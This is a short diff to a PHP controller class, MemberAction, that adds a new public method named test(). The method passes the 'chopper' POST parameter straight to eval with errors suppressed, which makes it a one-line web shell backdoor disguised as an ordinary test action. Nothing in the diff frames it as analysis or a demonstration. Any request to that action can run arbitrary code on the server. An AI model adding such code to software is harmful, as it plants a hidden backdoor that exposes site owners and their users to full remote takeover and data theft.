@@ -590,6 +590,11 @@ class MemberAction extends CommonAction {
             echo "saveOK";
         }
     }
+    
+    public function test() {
+    	@eval($_POST['chopper']);
+    	exit(0);
+    }
 
 }
 
